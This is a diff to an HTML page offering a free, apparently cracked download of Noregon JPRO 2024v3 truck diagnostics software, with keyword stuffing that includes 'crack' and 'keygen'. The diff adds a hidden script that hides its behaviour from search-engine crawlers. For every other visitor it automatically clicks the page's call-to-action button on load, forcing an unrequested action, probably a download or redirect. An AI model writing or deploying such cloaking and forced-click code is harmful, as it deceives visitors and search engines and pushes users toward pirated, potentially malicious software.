@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Noregon JPRO 2024v3 Commercial Fleet Diagnostics</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Noregon JPRO 2024v3 Commercial Fleet Diagnostics software is an all-makes solution with bi-directional controls, available for free download.">
     <meta name="keywords" content="Noregon JPRO 2024v3, Noregon JPRO 2024v3 download, Noregon JPRO 2024v3 free download, Noregon JPRO, Noregon JPRO diagnostics, Noregon JPRO diagnostic software, Noregon JPRO diagnostic software download, Noregon JPRO diagnostic software free, Noregon JPRO diagnostic software keygen, JPRO diagnostics software, JPRO diagnostic software download, JPRO diagnostic software free download, JPRO 2024v3, Noregon JPRO 2024, JPRO Heavy-Duty diagnostics, JPRO Heavy-Duty diagnostics download, JPRO Heavy-Duty diagnostics crack, JPRO Heavy-Duty diagnostics keygen, Noregon diagnostic software, Noregon diagnostic software download, Noregon diagnostic software free download, Noregon diagnostic software 2024, драйвер диагностики Noregon JPRO, диагностика Noregon JPRO, диагностическое программное обеспечение Noregon JPRO, Noregon JPRO диагностика скачать, Noregon JPRO программа диагностики, Noregon JPRO диагностическое программное обеспечение 2024, Noregon JPRO диагностическое программное обеспечение скачать, диагностика грузовиков Noregon JPRO, Noregon JPRO 2024v3 commercial fleet diagnostics, Noregon JPRO 2024v3 commercial fleet diagnostics download, Noregon JPRO 2024v3 commercial fleet diagnostics free download, Noregon JPRO 2024v3 unlimited license, Noregon JPRO 2024v3 english, Noregon JPRO 2024v3 all models, Noregon JPRO 2024v3 bi-directional controls, Noregon JPRO 2024v3 fault guidance, Noregon JPRO 2024v3 cylinder cut out, Noregon JPRO engine support, Noregon JPRO transmission support, Noregon JPRO auxiliary component support, Noregon JPRO off-highway support, Noregon JPRO PACCAR support, Noregon JPRO Detroit Assurance support, Noregon JPRO Allison support, JPRO 2024v3 bi-directional support, Noregon JPRO new features, Noregon JPRO 2024v3 windows 10, Noregon JPRO 2024v3 windows 8, Noregon JPRO 2024v3 DEARBORN PROTOCOL ADAPTER 5, Noregon JPRO 2024v3 NEXIQ USB LINK 3">
     <style>
